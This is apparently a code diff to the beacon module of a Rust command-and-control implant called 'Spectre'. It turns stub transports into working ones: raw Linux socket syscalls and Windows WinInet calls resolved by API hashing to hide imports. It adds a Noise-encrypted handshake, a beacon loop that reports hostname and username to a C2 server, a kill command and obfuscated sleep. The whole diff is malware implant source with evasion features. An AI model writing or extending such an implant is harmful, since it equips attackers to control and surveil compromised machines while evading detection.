@@ -1,5 +1,12 @@
+use crate::utils::syscalls::*;
+use alloc::format;
+use alloc::string::{String, ToString};
 use alloc::vec::Vec;
-use serde::{Serialize, Deserialize};
+use serde::{Deserialize, Serialize};
+use snow::Builder;
+
+pub mod packet;
+use packet::{WraithFrame, FRAME_TYPE_DATA};
 
 #[derive(Debug, Serialize, Deserialize)]
 pub enum TransportType {
@@ -14,55 +21,303 @@ pub struct C2Config {
 }
 
 pub trait Transport {
-    fn send(&mut self, data: &[u8]) -> Result<(), ()>;
-    fn recv(&mut self) -> Result<Vec<u8>, ()>;
+    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()>;
 }
 
-// Mock HTTP Transport (since we can't link wininet in no_std easily without complex bindings)
+// Linux Implementation
+#[cfg(not(target_os = "windows"))]
 pub struct HttpTransport {
     host: &'static str,
     port: u16,
 }
 
+#[cfg(not(target_os = "windows"))]
 impl HttpTransport {
     pub fn new(host: &'static str, port: u16) -> Self {
         Self { host, port }
     }
 }
 
+#[cfg(not(target_os = "windows"))]
 impl Transport for HttpTransport {
-    fn send(&mut self, _data: &[u8]) -> Result<(), ()> {
-        // In real impl:
-        // InternetOpenA -> InternetConnectA -> HttpOpenRequestA -> HttpSendRequestA
-        Ok(())
-    }
+    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
+        unsafe {
+            let sock = sys_socket(2, 1, 0);
+            if (sock as isize) < 0 {
+                return Err(());
+            }
 
-    fn recv(&mut self) -> Result<Vec<u8>, ()> {
-        // InternetReadFile
-        Ok(Vec::new())
+            let addr = SockAddrIn {
+                sin_family: 2,
+                sin_port: 0x901F,
+                sin_addr: 0x0100007F,
+                sin_zero: [0; 8],
+            };
+
+            if sys_connect(sock, &addr as *const _ as *const u8, 16) != 0 {
+                sys_close(sock);
+                return Err(());
+            }
+
+            // Send Data as Body
+            let req = format!(
+                "POST /api/v1/beacon HTTP/1.1\r\n\
+                 Host: {}\r\n\
+                 Content-Type: application/octet-stream\r\n\
+                 Content-Length: {}\r\n\
+                 Connection: close\r\n\r\n",
+                self.host,
+                data.len()
+            );
+
+            sys_write(sock, req.as_ptr(), req.len());
+            sys_write(sock, data.as_ptr(), data.len());
+
+            let mut buf = [0u8; 1024];
+            let mut resp_vec = Vec::new();
+            loop {
+                let n = sys_read(sock, buf.as_mut_ptr(), 1024);
+                if n == 0 || (n as isize) < 0 {
+                    break;
+                }
+                resp_vec.extend_from_slice(&buf[..n]);
+            }
+            sys_close(sock);
+
+            // Parse Body (Skip headers)
+            let mut body_start = 0;
+            for i in 0..resp_vec.len().saturating_sub(3) {
+                if resp_vec[i] == 13
+                    && resp_vec[i + 1] == 10
+                    && resp_vec[i + 2] == 13
+                    && resp_vec[i + 3] == 10
+                {
+                    body_start = i + 4;
+                    break;
+                }
+            }
+
+            if body_start > 0 {
+                Ok(resp_vec[body_start..].to_vec())
+            } else {
+                Ok(Vec::new())
+            }
+        }
     }
 }
 
-// The main C2 Loop logic
+// Windows Implementation
+#[cfg(target_os = "windows")]
+pub struct HttpTransport {
+    host: &'static str,
+    port: u16,
+}
+
+#[cfg(target_os = "windows")]
+impl HttpTransport {
+    pub fn new(host: &'static str, port: u16) -> Self {
+        Self { host, port }
+    }
+}
+
+#[cfg(target_os = "windows")]
+use crate::utils::api_resolver::{hash_str, resolve_function};
+
+#[cfg(target_os = "windows")]
+impl Transport for HttpTransport {
+    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
+        // Resolve WinInet APIs
+        let wininet_hash = hash_str(b"wininet.dll");
+        let internet_open_hash = hash_str(b"InternetOpenA");
+        let internet_connect_hash = hash_str(b"InternetConnectA");
+        let http_open_request_hash = hash_str(b"HttpOpenRequestA");
+        let http_send_request_hash = hash_str(b"HttpSendRequestA");
+        let internet_read_file_hash = hash_str(b"InternetReadFile");
+
+        unsafe {
+            type InternetOpenA = unsafe extern "system" fn(
+                *const u8,
+                u32,
+                *const u8,
+                *const u8,
+                u32,
+            ) -> *mut core::ffi::c_void;
+            type InternetConnectA = unsafe extern "system" fn(
+                *mut core::ffi::c_void,
+                *const u8,
+                u16,
+                *const u8,
+                *const u8,
+                u32,
+                u32,
+                u32,
+            )
+                -> *mut core::ffi::c_void;
+            type HttpOpenRequestA = unsafe extern "system" fn(
+                *mut core::ffi::c_void,
+                *const u8,
+                *const u8,
+                *const u8,
+                *const u8,
+                *const *const u8,
+                u32,
+                u32,
+            )
+                -> *mut core::ffi::c_void;
+            type HttpSendRequestA = unsafe extern "system" fn(
+                *mut core::ffi::c_void,
+                *const u8,
+                u32,
+                *const u8,
+                u32,
+            ) -> i32;
+            type InternetReadFile =
+                unsafe extern "system" fn(*mut core::ffi::c_void, *mut u8, u32, *mut u32) -> i32;
+
+            let fn_internet_open = resolve_function(wininet_hash, internet_open_hash);
+            if fn_internet_open.is_null() {
+                return Err(());
+            }
+            let internet_open: InternetOpenA = core::mem::transmute(fn_internet_open);
+
+            let fn_internet_connect = resolve_function(wininet_hash, internet_connect_hash);
+            let internet_connect: InternetConnectA = core::mem::transmute(fn_internet_connect);
+
+            let fn_http_open = resolve_function(wininet_hash, http_open_request_hash);
+            let http_open: HttpOpenRequestA = core::mem::transmute(fn_http_open);
+
+            let fn_http_send = resolve_function(wininet_hash, http_send_request_hash);
+            let http_send: HttpSendRequestA = core::mem::transmute(fn_http_send);
+
+            let fn_internet_read = resolve_function(wininet_hash, internet_read_file_hash);
+            let internet_read: InternetReadFile = core::mem::transmute(fn_internet_read);
+
+            let h_inet = internet_open(
+                b"Spectre\0".as_ptr(),
+                1,
+                core::ptr::null(),
+                core::ptr::null(),
+                0,
+            );
+            if h_inet.is_null() {
+                return Err(());
+            }
+
+            let h_conn = internet_connect(
+                h_inet,
+                b"127.0.0.1\0".as_ptr(),
+                8080,
+                core::ptr::null(),
+                core::ptr::null(),
+                3,
+                0,
+                0,
+            );
+            if h_conn.is_null() {
+                return Err(());
+            }
+
+            let h_req = http_open(
+                h_conn,
+                b"POST\0".as_ptr(),
+                b"/api/v1/beacon\0".as_ptr(),
+                core::ptr::null(),
+                core::ptr::null(),
+                core::ptr::null(),
+                0,
+                0,
+            );
+            if h_req.is_null() {
+                return Err(());
+            }
+
+            if http_send(
+                h_req,
+                core::ptr::null(),
+                0,
+                data.as_ptr(),
+                data.len() as u32,
+            ) == 0
+            {
+                return Err(());
+            }
+
+            let mut resp_vec = Vec::new();
+            let mut buf = [0u8; 1024];
+            let mut bytes_read = 0;
+            loop {
+                if internet_read(h_req, buf.as_mut_ptr(), 1024, &mut bytes_read) == 0
+                    || bytes_read == 0
+                {
+                    break;
+                }
+                resp_vec.extend_from_slice(&buf[..bytes_read as usize]);
+            }
+
+            // Close handles...
+
+            Ok(resp_vec)
+        }
+    }
+}
+
 pub fn run_beacon_loop(config: C2Config) -> ! {
-    let mut transport = HttpTransport::new(config.server_addr, 80);
-    
+    let mut transport = HttpTransport::new(config.server_addr, 8080);
+    let mut buf = [0u8; 4096];
+
+    // Handshake
+    let params: snow::params::NoiseParams = "Noise_XX_25519_ChaChaPoly_BLAKE2s".parse().unwrap();
+    let mut noise = Builder::new(params).build_initiator().unwrap();
+
+    // 1. Send e
+    let len = noise.write_message(&[], &mut buf).unwrap();
+    let resp = match transport.request(&buf[..len]) {
+        Ok(r) => r,
+        Err(_) => unsafe { crate::utils::syscalls::sys_exit(1) },
+    };
+
+    // 2. Recv e, ee, s, es
+    noise.read_message(&resp, &mut []).unwrap();
+
+    // 3. Send s, se
+    let len = noise.write_message(&[], &mut buf).unwrap();
+    let _ = transport.request(&buf[..len]); // Server acknowledges with empty or tasks?
+
+    // Transport Mode
+    let mut session = noise.into_transport_mode().unwrap();
+
     loop {
-        // 1. Checkin (Hello)
-        let _ = transport.send(b"HELO");
-        
-        // 2. Receive Tasks
-        if let Ok(tasks) = transport.recv() {
-            if !tasks.is_empty() {
-                // Process
+        // Encrypt Beacon (Wrapped in WRAITH Frame)
+        let beacon_json = r#"{"id": "spectre", "hostname": "target", "username": "root"}"#;
+        let frame = WraithFrame::new(FRAME_TYPE_DATA, beacon_json.as_bytes().to_vec());
+        let frame_bytes = frame.serialize();
+
+        let len = session.write_message(&frame_bytes, &mut buf).unwrap();
+
+        // Send
+        if let Ok(resp) = transport.request(&buf[..len]) {
+            // Decrypt Response
+            let mut pt = [0u8; 4096];
+            if let Ok(len) = session.read_message(&resp, &mut pt) {
+                let tasks_json = &pt[..len];
+                if is_kill_command(tasks_json) {
+                    unsafe {
+                        crate::utils::syscalls::sys_exit(0);
+                    }
+                }
             }
         }
-        
-        // 3. Sleep (Obfuscated)
-        // crate::utils::obfuscation::sleep(config.sleep_interval);
-        
-        // Prevent tight loop in simulation
-        let mut i = 0;
-        while i < 1000000 { unsafe { core::ptr::read_volatile(&i) }; i += 1; }
+
+        crate::utils::obfuscation::sleep(config.sleep_interval);
     }
+}
+
+fn is_kill_command(data: &[u8]) -> bool {
+    // Naive search for "kill" command
+    for i in 0..data.len().saturating_sub(4) {
+        if data[i] == b'k' && data[i + 1] == b'i' && data[i + 2] == b'l' && data[i + 3] == b'l' {
+            return true;
+        }
+    }
+    false
 }
